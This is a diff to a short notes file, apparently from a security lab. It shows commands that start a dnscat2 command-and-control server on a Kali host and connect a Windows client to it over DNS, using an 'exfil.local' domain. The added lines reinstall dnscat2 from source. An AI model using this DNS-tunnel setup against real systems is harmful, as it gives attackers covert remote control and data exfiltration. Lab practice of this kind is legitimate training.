@@ -1,3 +1,17 @@
 sudo ruby /usr/bin/dnscat2 --dns "host=KALI_IP,port=53,domain=exfil.local" --no-cache --secret=labpass
 
 .\dnscat2.exe --dns server=10.0.17.27,port=53,domain=exfil.local --secret=labpass
+
+
+# Remove the broken apt version
+sudo apt remove dnscat2 -y
+
+# Install dependencies
+sudo apt install ruby-dev libgmp-dev -y
+sudo gem install gmp
+
+# Clone and install fresh
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+gem install bundler
+bundle install
